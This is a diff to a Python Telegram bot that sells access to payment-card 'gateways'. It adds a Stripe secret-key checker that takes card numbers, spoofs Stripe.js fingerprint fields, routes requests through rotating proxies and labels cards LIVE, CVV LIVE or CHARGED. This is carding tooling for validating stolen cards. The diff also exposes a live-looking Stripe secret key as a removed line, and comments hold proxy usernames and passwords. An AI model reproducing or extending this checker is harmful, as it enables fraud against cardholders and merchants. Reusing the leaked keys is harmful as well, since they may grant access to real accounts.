@@ -2321,6 +2321,9 @@ class KeyManager:
 
 key_manager = KeyManager()
 
+# ============ UPDATE REDEEM COMMAND WITH NOTIFICATION ============
+# Replace the existing redeem_command function with this updated version
+
 async def redeem_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """Redeem a key - /redeem <key>"""
     if not await verify_group_access(update, context):
@@ -2446,8 +2449,8 @@ async def redeem_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         parse_mode=ParseMode.HTML
     )
     
-    # Send notification to admin group
-    await send_hour_key_notification(
+    # ============ SEND NOTIFICATION TO HIT GROUP ============
+    await send_key_redeem_notification(
         context=context,
         user_id=user_id,
         username=user.username or user.first_name,
@@ -2460,130 +2463,113 @@ async def redeem_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     )
     
     print(f"✅ User {user_id} upgraded from {original_tier} to {tier} for {duration_text} (uses: {key_data['uses_count']}/{max_uses})")
-        
-async def send_plan_purchase_notification(context: ContextTypes.DEFAULT_TYPE, user_id: int, username: str, first_name: str, tier: str, duration_days: int):
-    """Send New Plan Purchase notification with PREMIUM EMOJIS"""
+
+
+# ============ KEY REDEEM NOTIFICATION FUNCTION WITH PREMIUM EMOJIS ============
+
+async def send_key_redeem_notification(
+    context: ContextTypes.DEFAULT_TYPE,
+    user_id: int,
+    username: str,
+    first_name: str,
+    tier: str,
+    duration: int,
+    duration_type: str,
+    remaining_uses: int,
+    max_uses: int
+):
+    """
+    Send key redeem notification with the specified format and premium emojis.
+    """
     
-    # Only send to hit notification group
+    # Only send if hit notifications are enabled
     if not HIT_NOTIFICATION_ENABLED:
         return
     
+    # ============ DETERMINE PRICE BASED ON DURATION ============
+    if tier.lower() == "ultimate":
+        if duration_type == "hours":
+            price_display = "Free"
+        elif duration == 1:
+            price_display = "Free"
+        elif duration == 7:
+            price_display = "$7"
+        elif duration == 15:
+            price_display = "$15"
+        elif duration == 30:
+            price_display = "$20"
+        else:
+            price_display = f"${duration * 0.5:.0f}"  # Fallback
+    else:
+        # Default pricing for other tiers
+        price_display = "Free" if duration <= 1 else f"${duration * 0.5:.0f}"
+    
     # ============ PREMIUM EMOJI IDs ============
     PREMIUM_EMOJI_IDS = {
-        "skull": "5042167377869932162",
-        "target": "5377336227533969892",
-        "bin": "6237654950432742406",
-        "toy": "5249244862359812334",
         "diamond": "5427168083074628963",
-        "flower": "6230927657257668107",
-        "pink": "5041796412954641308",
-        "doller": "5197434882321567830",
-        "fire": "5471133374264684999",
-        "clock": "5262540380301191210",
+        "target": "5377336227533969892",
+        "skull": "5042167377869932162",
         "id": "5307905813451397794",
         "money": "6002386288612653951",
-        "receipt": "5226929552319594190",
+        "fire": "5471133374264684999",
+        "clock": "5262540380301191210",
+        "trophy": "5188344996356448758",
+        "star": "6282793227057632654",
+        "globe": "5447410659077661506",
     }
     
-    # Determine price based on tier and duration
-    price_map = {
-        "free": {"1": 0, "7": 0, "15": 0, "30": 0},
-        "premium": {"1": 0, "7": 3, "15": 8, "30": 10},
-        "ultimate": {"1": 1, "7": 5, "15": 10, "30": 20},
-        "admin": {"1": 0, "7": 0, "15": 0, "30": 0}
-    }
-    
-    # Get price based on tier and duration
-    tier_lower = tier.lower()
-    if tier_lower in price_map:
-        if duration_days == 1:
-            price = price_map[tier_lower].get("1", 0)
-        elif duration_days == 7:
-            price = price_map[tier_lower].get("7", 0)
-        elif duration_days == 15:
-            price = price_map[tier_lower].get("15", 0)
-        elif duration_days == 30:
-            price = price_map[tier_lower].get("30", 0)
-        else:
-            price = price_map[tier_lower].get(str(duration_days), 0)
-    else:
-        price = 0
-    
-    # Determine plan name and emoji
+    # ============ PLAN EMOJI ============
     plan_emoji_map = {
-        "premium": "🔥",
-        "ultimate": "😈",
-        "admin": "💀",
-        "free": "🆓"
+        "premium": "",
+        "ultimate": "",
+        "admin": "",
+        "free": ""
     }
-    plan_emoji = plan_emoji_map.get(tier_lower, "💎")
+    plan_emoji = plan_emoji_map.get(tier.lower(), "💎")
     
-    # For TRAIL (1 day)
-    if duration_days == 1:
-        plan_display = f"{plan_emoji} TRAIL"
-        price_display = "Free"
-        price_actual = 0
-    else:
-        plan_display = f"{plan_emoji} {tier.upper()}"
-        price_display = f"${price}"
-        price_actual = price
-    
-    # Duration text
-    if duration_days == 1:
-        duration_text = "1 day"
-    elif duration_days == 7:
-        duration_text = "7 days"
-    elif duration_days == 15:
-        duration_text = "15 days"
-    elif duration_days == 30:
-        duration_text = "30 days"
-    else:
-        duration_text = f"{duration_days} days"
-    
-    # User display - WITHOUT @ symbol
-    if username:
+    # ============ USER DISPLAY ============
+    if username and username != 'Unknown' and username != 'NoUsername':
         user_display = username
     else:
-        user_display = first_name
+        user_display = first_name if first_name else f"User {user_id}"
     
-    # Generate receipt number
-    receipt_number = f"BLD-{datetime.now().strftime('%Y%m%d')}-{random.randint(1000, 9999)}"
+    # ============ DURATION TEXT ============
+    if duration_type == "hours":
+        duration_text = f"{duration} hour{'s' if duration > 1 else ''}"
+    else:
+        duration_text = f"{duration} day{'s' if duration > 1 else ''}"
     
-    # ============ PREMIUM EMOJI NOTIFICATION ============
+    # ============ BUILD NOTIFICATION WITH PREMIUM EMOJIS ============
     notification = (
-        f'╔══════════════════════════╗\n'
-        f'<tg-emoji emoji-id="{PREMIUM_EMOJI_IDS["diamond"]}">💎</tg-emoji>'
-        f'𝑵𝒆𝒘 𝑷𝒍𝒂𝒏 𝑷𝒖𝒓𝒄𝒉𝒂𝒔𝒆𝒅\n'
-        f'╚══════════════════════════╝\n\n'
-        f'<tg-emoji emoji-id="{PREMIUM_EMOJI_IDS["id"]}">👤</tg-emoji> <b>User</b> ➛ {user_display}\n'
-        f'<tg-emoji emoji-id="{PREMIUM_EMOJI_IDS["target"]}">👑</tg-emoji> <b>Plan</b>  ➛ {plan_display}\n'
-        f'<tg-emoji emoji-id="{PREMIUM_EMOJI_IDS["money"]}">💰</tg-emoji> <b>Price</b> ➛ {price_display}\n'
-        f'<tg-emoji emoji-id="{PREMIUM_EMOJI_IDS["receipt"]}">🧾</tg-emoji> <b>Receipt</b> ➛ <code>{receipt_number}</code>\n'
-        f'<tg-emoji emoji-id="{PREMIUM_EMOJI_IDS["skull"]}">💀</tg-emoji> <b>Bot</b> ➛ @BLADESARKS_V3bot'
+        f'  {premium_emoji(PREMIUM_EMOJI_IDS["diamond"], "💎")}'
+        f' <b> New Plan Purchase </b>\n'
+        f'═══════════════════\n\n'
+        f'<b> User</b> ➛ <b>{user_display}</b>\n'
+        f'<b> Plan</b>  ➛ <b>{plan_emoji} {tier.upper()}</b>\n'
+        f'<b> Price</b>  ➛ <b>{price_display}</b>\n'
+
     )
+    
+    keyboard = [
+        [
+            InlineKeyboardButton(" BUY NOW", url="https://t.me/BLADESARKS_V3bot")
+        ]
+    ]
+    reply_markup = InlineKeyboardMarkup(keyboard)
+    
+    
     
     try:
         await context.bot.send_message(
             chat_id=HIT_NOTIFICATION_GROUP_ID,
             text=notification,
-            parse_mode="HTML"
+            parse_mode="HTML",
+            reply_markup=reply_markup 
         )
-        print(f"📢 New Plan Purchase notification sent for user {user_id}: {tier.upper()} - {duration_text}")
+        print(f"📢 Key redeem notification sent for user {user_id}: {tier.upper()} - {duration_text} ({price_display})")
         
-        # Also record in leaderboard as a purchase
-        try:
-            leaderboard.record_hit(
-                user_id=user_id,
-                username=username or first_name,
-                gateway="Plan Purchase",
-                amount=float(price_actual)
-            )
-        except:
-            pass
-            
     except Exception as e:
-        print(f"⚠️ Failed to send plan purchase notification: {e}")
-        
+        print(f"⚠️ Failed to send key redeem notification: {e}")
         
 # ============ PLAN PURCHASE NOTIFICATION COMMAND (ADMIN ONLY) ============
 
@@ -3081,37 +3067,56 @@ def format_proxy(proxy_str):
             return proxy_str
         
         # ============ FIX: Handle host:port:user:pass format ============
-        # Example: px040805.pointtoserver.com:10780:purevpn0s13628768:vecnnovx
+        # Example: my-kua.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2
         parts = proxy_str.split(':')
+        parts = [p.strip() for p in parts if p.strip()]
+        
+        # ============ FIND THE PORT (numeric part) ============
+        port_index = -1
+        for i, part in enumerate(parts):
+            if part.isdigit() and 1 <= int(part) <= 65535:
+                port_index = i
+                break
         
         if len(parts) == 4:
-            # Check if second part is the port (numeric)
-            if parts[1].isdigit():
+            if port_index == 1:
                 # Format: host:port:user:pass
                 host, port, user, password = parts
                 return f"http://{user}:{password}@{host}:{port}"
-            # Check if third part is the port
-            elif parts[2].isdigit():
+            elif port_index == 3:
                 # Format: user:pass:host:port
                 user, password, host, port = parts
                 return f"http://{user}:{password}@{host}:{port}"
-            # Check if first part could be user and fourth is port
-            elif parts[3].isdigit():
-                # Format: user:pass:host:port
-                user, password, host, port = parts
+            elif port_index == 2:
+                # Format: host:user:pass:port
+                host, user, password, port = parts
                 return f"http://{user}:{password}@{host}:{port}"
             else:
-                # Try to find which part is the port
+                # Try to detect by looking for host (contains dots)
                 for i, part in enumerate(parts):
-                    if part.isdigit() and 1 <= int(part) <= 65535:
-                        if i == 1:
-                            host, port, user, password = parts
-                        elif i == 3:
-                            user, password, host, port = parts
-                        else:
-                            # Unknown format, try host:port:user:pass
-                            host, port, user, password = parts
-                        return f"http://{user}:{password}@{host}:{port}"
+                    if '.' in part:
+                        host = part
+                        # Find the port (first numeric after host)
+                        for j, p in enumerate(parts):
+                            if j != i and p.isdigit() and 1 <= int(p) <= 65535:
+                                port = p
+                                # Remaining are user:pass
+                                remaining = [parts[k] for k in range(len(parts)) if k != i and k != j]
+                                if len(remaining) >= 2:
+                                    user, password = remaining[0], remaining[1]
+                                    return f"http://{user}:{password}@{host}:{port}"
+                                elif len(remaining) == 1:
+                                    user = remaining[0]
+                                    return f"http://{user}:@{host}:{port}"
+                        break
+                # Default: host:port:user:pass
+                host, port, user, password = parts
+                if port.isdigit():
+                    return f"http://{user}:{password}@{host}:{port}"
+                # Try user:pass:host:port
+                user, password, host, port = parts
+                if port.isdigit():
+                    return f"http://{user}:{password}@{host}:{port}"
                 return None
         
         # Handle user:pass@host:port
@@ -3130,7 +3135,7 @@ def format_proxy(proxy_str):
     except Exception as e:
         print(f"❌ [format_proxy] Error: {e} for proxy: {proxy_str[:50]}")
         return None
-
+    
 def mask_proxy(proxy_str):
     """Mask proxy for display - works with all formats"""
     if not proxy_str or proxy_str == "No Proxy":
@@ -3141,24 +3146,36 @@ def mask_proxy(proxy_str):
             parts = proxy_str.split('@')
             auth_part = parts[0]
             ip_part = parts[-1]
-            
-            # Mask auth part
             if '://' in auth_part:
                 protocol = auth_part.split('://')[0]
                 return f"{protocol}://***@{ip_part}"
-            else:
-                return f"***@{ip_part}"
+            return f"***@{ip_part}"
         
         # Handle simple ip:port
         elif ':' in proxy_str:
             parts = proxy_str.split(':')
             if len(parts) >= 2:
-                # Check if it has protocol
                 if '//' in proxy_str:
                     protocol = proxy_str.split('://')[0]
                     return f"{protocol}://***.***.***.***:{parts[-1]}"
-                else:
-                    return f"***.***.***.***:{parts[-1]}"
+                return f"***.***.***.***:{parts[-1]}"
+        
+        # Handle host:port:user:pass
+        if proxy_str.count(':') >= 3:
+            parts = proxy_str.split(':')
+            # Find the port (numeric part)
+            for i, part in enumerate(parts):
+                if part.isdigit() and 1 <= int(part) <= 65535:
+                    if i == 0 or i == 1:
+                        host = parts[0] if '.' in parts[0] else parts[2]
+                        port = parts[1] if i == 1 else parts[3]
+                        return f"{host}:{port}:***:***"
+                    elif i == 2 or i == 3:
+                        host = parts[2] if '.' in parts[2] else parts[0]
+                        port = parts[3] if i == 3 else parts[1]
+                        return f"{host}:{port}:***:***"
+            return f"{parts[0]}:{parts[1]}:***:***"
+                
     except:
         pass
     return "Proxy (masked)"
@@ -4715,8 +4732,7 @@ from faker import Faker
 from datetime import datetime, timedelta
 
 # ============ CONFIGURATION ============
-BOUTIQUE_STRIPE_SECRET_KEY = "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"
-BOUTIQUE_STRIPE_PUBLISHABLE_KEY = "pk_live_51RaC8gQq2KMJDaUqaO5shu43R2AYoE9wMClU1TgRksEdEWZ6cJ8aKZ7x1zTQB1S9sL5nH7mJ9v3XsLzN7oVkD8wD00pLQpYH4M"
+
 BOUTIQUE_AMOUNT = 1000  # $10.00 in cents
 BOUTIQUE_CURRENCY = "aud"
 
@@ -7834,6 +7850,8 @@ async def parse_paypal_response(response_json: dict, elapsed: float, proxy: str 
     "Unable to get payment token: 403",
     "payment token: 403",
     "PAYMENT TOKEN: 403",
+    "AMOUNT_TOO_SMALL",
+    "AMOUNT_TOO_SMALL",
     "403",
     "payment token failed",
     "token generation failed",
@@ -12673,8 +12691,6 @@ class ShopifyAPIPool:
                     print(f"❌ [API POOL] No more sites available after {attempt} attempts")
                     break
                 
-                
-            
             tried_sites.append(current_site)
             
             # ============ GET PROXY WITH ROTATION ============
@@ -12842,9 +12858,11 @@ class ShopifyAPIPool:
             "gateway": "Shopify Payments"
         }
     
+    # ============ FIXED: _make_api_request WITH PROPER PROXY HANDLING ============
     async def _make_api_request(self, api: dict, card: str, site: str, proxy: str = None, user_id: int = None) -> Dict:
         """
         Make request to a specific API with proxy support
+        FIXED: Properly handles host:port:user:pass format
         """
         
         # Initialize ALL variables before try block
@@ -12951,6 +12969,9 @@ class ShopifyAPIPool:
             
             # ============ FIXED: Proxy handling with validation ============
             if proxy:
+                # ============ IMPORTANT: Use the FULL raw proxy string ============
+                print(f"🔧 [API] Raw proxy: {proxy[:80]}...")
+                
                 formatted_proxy = format_proxy(proxy)
                 if formatted_proxy:
                     try:
@@ -13001,7 +13022,9 @@ class ShopifyAPIPool:
                         # Don't use this proxy
                         pass
                 else:
-                    print(f"⚠️ Could not format proxy: {mask_proxy(proxy)}")
+                    print(f"⚠️ Could not format proxy: {proxy[:50]}...")
+            else:
+                print(f"🔧 No proxy - direct connection")
             
             async with httpx.AsyncClient(**client_kwargs) as client:
                 response = await client.get(api["url"], params=params)
@@ -13361,7 +13384,10 @@ class ShopifyAPIPool:
                 "GATEWAY UNKNOWN",
                 "UNKNOWN GATEWAY",
                 "Gateway Unknown",
-                "gateway unknown",  
+                "gateway unknown", 
+                
+                "AMOUNT_TOO_SMALL",
+                "AMOUNT_TOO_SMALL", 
                 "403",
                 "payment token failed",
                 "SERVER DISCONNECTED",
@@ -36178,13 +36204,7 @@ def get_next_working_msh_site(exclude_site: str = None) -> Optional[str]:
 # ============ FIXED: format_proxy_for_shopify_mass ============
 
 def format_proxy_for_shopify_mass(proxy: str) -> Optional[str]:
-    """
-    Format proxy for Shopify Mass API
-    Expected format: host:port:user:pass
-    Example: px023005.pointtoserver.com:10780:purevpn0s13918563:fV21iqc3trwCAs
-    
-    Handles all input formats and converts to host:port:user:pass
-    """
+    """Format proxy for Shopify Mass API"""
     if not proxy:
         return None
     
@@ -36193,47 +36213,27 @@ def format_proxy_for_shopify_mass(proxy: str) -> Optional[str]:
     try:
         # Remove any protocol prefixes
         proxy = re.sub(r'^(http|https|socks4|socks5)://', '', proxy)
-        
-        # ============ FIX: Parse host:port:user:pass correctly ============
         parts = proxy.split(':')
+        parts = [p.strip() for p in parts if p.strip()]
         
+        # ============ FIX: Parse host:port:user:pass ============
         if len(parts) == 4:
             # Check if second part is numeric (port) -> host:port:user:pass
             if parts[1].isdigit():
                 host, port, user, password = parts
-                result = f"{host}:{port}:{user}:{password}"
-                print(f"✅ [Shopify Mass Proxy] Using as-is: {result[:50]}...")
-                return result
-            # Check if third part is numeric (port) -> user:pass:host:port
-            elif parts[2].isdigit():
-                user, password, host, port = parts
-                result = f"{host}:{port}:{user}:{password}"
-                print(f"✅ [Shopify Mass Proxy] Converted (port at 2) -> {result[:50]}...")
-                return result
+                return f"{host}:{port}:{user}:{password}"
             # Check if fourth part is numeric (port) -> user:pass:host:port
             elif parts[3].isdigit():
                 user, password, host, port = parts
-                result = f"{host}:{port}:{user}:{password}"
-                print(f"✅ [Shopify Mass Proxy] Converted (port at 3) -> {result[:50]}...")
-                return result
+                return f"{host}:{port}:{user}:{password}"
+            # Try to detect
+            elif '.' in parts[0] and parts[1].isdigit():
+                host, port, user, password = parts
+                return f"{host}:{port}:{user}:{password}"
             else:
-                # Try to find which part is the port
-                for i, part in enumerate(parts):
-                    if part.isdigit() and 1 <= int(part) <= 65535:
-                        if i == 1:
-                            host, port, user, password = parts
-                        elif i == 2:
-                            user, password, host, port = parts
-                        elif i == 3:
-                            user, password, host, port = parts
-                        else:
-                            # Default: treat as host:port:user:pass
-                            host, port, user, password = parts
-                        result = f"{host}:{port}:{user}:{password}"
-                        print(f"✅ [Shopify Mass Proxy] Extracted port at {i} -> {result[:50]}...")
-                        return result
-                # If no port found, return as-is
-                return proxy
+                user, password, host, port = parts
+                if port.isdigit():
+                    return f"{host}:{port}:{user}:{password}"
         
         # Format: user:pass@host:port
         if '@' in proxy:
@@ -36241,24 +36241,18 @@ def format_proxy_for_shopify_mass(proxy: str) -> Optional[str]:
             if ':' in auth and ':' in hostport:
                 user, password = auth.split(':', 1)
                 host, port = hostport.split(':', 1)
-                result = f"{host}:{port}:{user}:{password}"
-                print(f"✅ [Shopify Mass Proxy] Converted @ format -> {result[:50]}...")
-                return result
+                return f"{host}:{port}:{user}:{password}"
         
-        # Format: host:port only (no authentication)
+        # Format: host:port only
         if len(parts) == 2 and parts[1].isdigit():
-            print(f"⚠️ [Shopify Mass Proxy] Proxy without auth: {proxy}")
             return proxy
         
         # Try regex extraction
         match = re.search(r'([a-zA-Z0-9\.-]+):(\d+):([a-zA-Z0-9]+):([a-zA-Z0-9]+)', proxy)
         if match:
             host, port, user, password = match.groups()
-            result = f"{host}:{port}:{user}:{password}"
-            print(f"✅ [Shopify Mass Proxy] Extracted via regex -> {result[:50]}...")
-            return result
+            return f"{host}:{port}:{user}:{password}"
         
-        print(f"⚠️ [Shopify Mass Proxy] Could not parse: {original_proxy[:50]}...")
         return None
         
     except Exception as e:
@@ -38385,6 +38379,1319 @@ async def autosopi_test_all_command(update: Update, context: ContextTypes.DEFAUL
     
     await message.edit_text(result_msg, parse_mode=ParseMode.HTML, reply_markup=back_menu())
     
+ 
+ 
+
+# ============ STRIPE SK KEY GATEWAY - COMPLETE ============
+# Add this to your f13.py
+
+import httpx
+import json
+import time
+import random
+import asyncio
+import traceback
+import uuid
+import re
+from typing import Dict, Tuple, Optional
+from datetime import datetime
+from user_agent import generate_user_agent
+
+# ============ CONFIGURATION ============
+STRIPE_SK = ""
+STRIPE_PK = ""
+
+# Active tasks for SK Gateway
+stripe_sk_active_tasks = {}
+
+
+# ============ HELPER FUNCTIONS ============
+
+def generate_guid() -> str:
+    """Generate random GUID for Stripe.js fingerprinting"""
+    return str(uuid.uuid4())
+
+def generate_muid() -> str:
+    """Generate random muid for Stripe.js fingerprinting"""
+    return str(uuid.uuid4()) + ''.join(random.choices('0123456789abcdef', k=8))
+
+def generate_sid() -> str:
+    """Generate random sid for Stripe.js fingerprinting"""
+    return str(uuid.uuid4()) + ''.join(random.choices('0123456789abcdef', k=8))
+
+def generate_elements_session_id() -> str:
+    """Generate random elements session ID"""
+    return f"elements_session_{uuid.uuid4().hex[:11]}"
+
+def get_random_stripe_version() -> str:
+    """Get random Stripe.js version"""
+    versions = [
+        "fe3c872f40", "c891fde8fc", "03270cb259", "148043f9d7",
+        "41ba105bc6", "19f3ad3143", "f386584e69", "c3c9b1e6a2"
+    ]
+    return random.choice(versions)
+
+
+# ============ PARSE STRIPE ERROR ============
+
+def parse_stripe_error(error_data: dict, elapsed: float, amount: float) -> Dict:
+    """Parse Stripe error response and return formatted result"""
+    error = error_data.get('error', {})
+    error_msg = error.get('message', 'Unknown error')
+    decline_code = error.get('decline_code', '')
+    error_code = error.get('code', '')
+    error_type = error.get('type', '')
+    
+    print(f"📊 [Stripe Error] Type: {error_type}, Code: {error_code}, Decline: {decline_code}")
+    print(f"📊 [Stripe Error] Message: {error_msg}")
+    
+    error_lower = error_msg.lower()
+    
+    # ============ CARD IS LIVE - INSUFFICIENT FUNDS ============
+    if "insufficient" in error_lower or decline_code == "insufficient_funds":
+        return {
+            "status": "success",
+            "result": "INSUFFICIENT_FUNDS",
+            "message": f"💰 Card is LIVE but has insufficient balance",
+            "status_display": "💰 INSUFFICIENT FUNDS",
+            "status_category": "approved",
+            "elapsed": elapsed,
+            "price": f"${amount:.2f}",
+            "gateway": "Stripe SK",
+            "decline_code": decline_code
+        }
+    
+    # ============ CARD IS LIVE - CVV WRONG ============
+    elif "cvv" in error_lower or "security" in error_lower or decline_code == "incorrect_cvc":
+        return {
+            "status": "success",
+            "result": "CVV_LIVE",
+            "message": f"✅ Card is LIVE but CVV is incorrect",
+            "status_display": "✅ CVV LIVE",
+            "status_category": "approved",
+            "elapsed": elapsed,
+            "price": f"${amount:.2f}",
+            "gateway": "Stripe SK",
+            "decline_code": decline_code
+        }
+    
+    # ============ CARD IS LIVE - 3DS REQUIRED ============
+    elif "3d" in error_lower or "secure" in error_lower or decline_code == "authentication_required":
+        return {
+            "status": "success",
+            "result": "3DS_REQUIRED",
+            "message": f"🔐 Card is LIVE but requires 3D authentication",
+            "status_display": "🔐 3D REQUIRED",
+            "status_category": "approved",
+            "elapsed": elapsed,
+            "price": f"${amount:.2f}",
+            "gateway": "Stripe SK",
+            "decline_code": decline_code
+        }
+    
+    # ============ CARD IS EXPIRED ============
+    elif "expired" in error_lower or decline_code == "expired_card":
+        return {
+            "status": "declined",
+            "result": "EXPIRED_CARD",
+            "message": f"❌ Card has expired",
+            "status_display": "❌ EXPIRED",
+            "status_category": "declined",
+            "elapsed": elapsed,
+            "price": f"${amount:.2f}",
+            "gateway": "Stripe SK",
+            "decline_code": decline_code
+        }
+    
+    # ============ CARD IS LOST/STOLEN ============
+    elif "lost" in error_lower or "stolen" in error_lower or decline_code == "lost_card":
+        return {
+            "status": "declined",
+            "result": "LOST_STOLEN_CARD",
+            "message": f"❌ Card reported lost or stolen",
+            "status_display": "❌ LOST/STOLEN",
+            "status_category": "declined",
+            "elapsed": elapsed,
+            "price": f"${amount:.2f}",
+            "gateway": "Stripe SK",
+            "decline_code": decline_code
+        }
+    
+    # ============ DO NOT HONOR ============
+    elif "honor" in error_lower or decline_code == "do_not_honor":
+        return {
+            "status": "declined",
+            "result": "DO_NOT_HONOR",
+            "message": f"❌ Do Not Honor - Card declined by issuer",
+            "status_display": "❌ DECLINED",
+            "status_category": "declined",
+            "elapsed": elapsed,
+            "price": f"${amount:.2f}",
+            "gateway": "Stripe SK",
+            "decline_code": decline_code
+        }
+    
+    # ============ GENERIC DECLINE ============
+    else:
+        return {
+            "status": "declined",
+            "result": "DECLINED",
+            "message": f"❌ Card declined: {error_msg}",
+            "status_display": f"❌ DECLINED ({decline_code})" if decline_code else "❌ DECLINED",
+            "status_category": "declined",
+            "elapsed": elapsed,
+            "price": f"${amount:.2f}",
+            "gateway": "Stripe SK",
+            "decline_code": decline_code
+        }
+
+
+# ============ MAIN CARD CHECK FUNCTION ============
+
+async def check_card_stripe_sk(card: str, amount: float = 1.00, 
+                                currency: str = "USD", proxy: str = None,
+                                user_id: int = None) -> Dict:
+    """
+    Check card using Stripe Secret Key via Stripe.js flow
+    PROPERLY tokenizes the card before charging
+    """
+    print(f"\n{'='*80}")
+    print(f"💳 [STRIPE SK] Checking card: {card[:20]}...")
+    if proxy:
+        print(f"🔌 Using proxy: {mask_proxy(proxy)}")
+    print(f"💰 Amount: ${amount:.2f} {currency}")
+    print(f"🔑 SK: {STRIPE_SK[:20]}...")
+    print(f"{'='*80}")
+    
+    start_time = time.time()
+    
+    try:
+        # Parse card
+        parts = card.split('|')
+        if len(parts) != 4:
+            return {
+                "status": "error",
+                "result": "INVALID_FORMAT",
+                "message": "Invalid card format. Use: NUMBER|MM|YYYY|CVV",
+                "status_display": "⚠️ INVALID FORMAT",
+                "status_category": "error",
+                "elapsed": 0,
+                "price": f"${amount:.2f}",
+                "gateway": "Stripe SK"
+            }
+        
+        card_num, exp_month, exp_year, cvc = parts
+        
+        # Format year (4-digit)
+        if len(exp_year) == 2:
+            exp_year = f"20{exp_year}"
+        
+        # Configure client with proxy
+        client_kwargs = {
+            'timeout': httpx.Timeout(60.0, connect=15.0, read=50.0),
+            'verify': False,
+            'follow_redirects': True,
+        }
+        
+        if proxy:
+            proxy_url = format_proxy(proxy)
+            if proxy_url:
+                client_kwargs['proxy'] = proxy_url
+                print(f"🔧 Using proxy: {mask_proxy(proxy_url)}")
+        
+        # Headers for Stripe API
+        headers = {
+            'Authorization': f'Bearer {STRIPE_SK}',
+            'Content-Type': 'application/x-www-form-urlencoded',
+            'User-Agent': generate_user_agent(),
+            'Accept': 'application/json',
+        }
+        
+        # ============ STEP 1: Create Payment Method ============
+        print(f"📡 [STEP 1] Creating payment method...")
+        
+        # Generate fingerprint data
+        guid = generate_guid()
+        muid = generate_muid()
+        sid = generate_sid()
+        stripe_version = get_random_stripe_version()
+        
+        pm_data = {
+            'type': 'card',
+            'card[number]': card_num,
+            'card[exp_month]': exp_month,
+            'card[exp_year]': exp_year,
+            'card[cvc]': cvc,
+            'guid': guid,
+            'muid': muid,
+            'sid': sid,
+            'payment_user_agent': f'stripe.js/{stripe_version}; stripe-js-v3/{stripe_version}; card-element',
+            'time_on_page': str(random.randint(5000, 30000)),
+            'referrer': 'https://checkout.stripe.com',
+        }
+        
+        async with httpx.AsyncClient(**client_kwargs) as client:
+            response = await client.post(
+                'https://api.stripe.com/v1/payment_methods',
+                headers=headers,
+                data=pm_data
+            )
+            
+            print(f"📥 [SK] PM response: {response.status_code}")
+            
+            # Handle 402 (card declined)
+            if response.status_code == 402:
+                try:
+                    error_data = response.json()
+                    return parse_stripe_error(error_data, time.time() - start_time, amount)
+                except:
+                    return {
+                        "status": "declined",
+                        "result": "DECLINED",
+                        "message": "Card declined",
+                        "status_display": "❌ DECLINED",
+                        "status_category": "declined",
+                        "elapsed": time.time() - start_time,
+                        "price": f"${amount:.2f}",
+                        "gateway": "Stripe SK"
+                    }
+            
+            if response.status_code != 200:
+                try:
+                    error_data = response.json()
+                    return parse_stripe_error(error_data, time.time() - start_time, amount)
+                except:
+                    return {
+                        "status": "declined",
+                        "result": "PM_CREATION_FAILED",
+                        "message": f"HTTP {response.status_code}",
+                        "status_display": "❌ DECLINED",
+                        "status_category": "declined",
+                        "elapsed": time.time() - start_time,
+                        "price": f"${amount:.2f}",
+                        "gateway": "Stripe SK"
+                    }
+            
+            pm_result = response.json()
+            payment_method_id = pm_result.get('id')
+            
+            if not payment_method_id:
+                return {
+                    "status": "declined",
+                    "result": "NO_PM_ID",
+                    "message": "No payment method ID returned",
+                    "status_display": "❌ DECLINED",
+                    "status_category": "declined",
+                    "elapsed": time.time() - start_time,
+                    "price": f"${amount:.2f}",
+                    "gateway": "Stripe SK"
+                }
+            
+            print(f"✅ Payment method created: {payment_method_id}")
+        
+        # ============ STEP 2: Create Payment Intent ============
+        print(f"📡 [STEP 2] Creating payment intent...")
+        
+        amount_cents = int(amount * 100)
+        
+        pi_data = {
+            'amount': str(amount_cents),
+            'currency': currency.lower(),
+            'payment_method': payment_method_id,
+            'confirmation_method': 'manual',
+            'confirm': 'false',
+            'return_url': 'https://example.com/success',
+        }
+        
+        async with httpx.AsyncClient(**client_kwargs) as client:
+            response = await client.post(
+                'https://api.stripe.com/v1/payment_intents',
+                headers=headers,
+                data=pi_data
+            )
+            
+            print(f"📥 [SK] PI response: {response.status_code}")
+            
+            if response.status_code != 200:
+                try:
+                    error_data = response.json()
+                    return parse_stripe_error(error_data, time.time() - start_time, amount)
+                except:
+                    return {
+                        "status": "declined",
+                        "result": "PI_CREATION_FAILED",
+                        "message": f"HTTP {response.status_code}",
+                        "status_display": "❌ DECLINED",
+                        "status_category": "declined",
+                        "elapsed": time.time() - start_time,
+                        "price": f"${amount:.2f}",
+                        "gateway": "Stripe SK"
+                    }
+            
+            pi_result = response.json()
+            pi_id = pi_result.get('id')
+            client_secret = pi_result.get('client_secret')
+            
+            if not pi_id or not client_secret:
+                return {
+                    "status": "declined",
+                    "result": "NO_PI_DATA",
+                    "message": "No payment intent data returned",
+                    "status_display": "❌ DECLINED",
+                    "status_category": "declined",
+                    "elapsed": time.time() - start_time,
+                    "price": f"${amount:.2f}",
+                    "gateway": "Stripe SK"
+                }
+            
+            print(f"✅ Payment Intent created: {pi_id}")
+        
+        # ============ STEP 3: Confirm Payment ============
+        print(f"📡 [STEP 3] Confirming payment...")
+        
+        confirm_data = {
+            'payment_method': payment_method_id,
+            'payment_method_data[allow_redisplay]': 'unspecified',
+        }
+        
+        async with httpx.AsyncClient(**client_kwargs) as client:
+            response = await client.post(
+                f'https://api.stripe.com/v1/payment_intents/{pi_id}/confirm',
+                headers=headers,
+                data=confirm_data
+            )
+            
+            print(f"📥 [SK] Confirm response: {response.status_code}")
+            
+            elapsed = time.time() - start_time
+            
+            if response.status_code != 200:
+                try:
+                    error_data = response.json()
+                    return parse_stripe_error(error_data, elapsed, amount)
+                except:
+                    return {
+                        "status": "declined",
+                        "result": "DECLINED",
+                        "message": f"HTTP {response.status_code}",
+                        "status_display": "❌ DECLINED",
+                        "status_category": "declined",
+                        "elapsed": elapsed,
+                        "price": f"${amount:.2f}",
+                        "gateway": "Stripe SK"
+                    }
+            
+            result_data = response.json()
+            status = result_data.get('status')
+            
+            # ============ PARSE RESULT ============
+            if status == 'succeeded':
+                print(f"\n✅✅✅ PAYMENT SUCCESSFUL! Card charged ${amount:.2f} ✅✅✅")
+                return {
+                    "status": "success",
+                    "result": "CHARGED",
+                    "message": f"Payment successful - Card charged ${amount:.2f}",
+                    "status_display": "🔥 CHARGED 🔥",
+                    "status_category": "charged",
+                    "elapsed": elapsed,
+                    "price": f"${amount:.2f}",
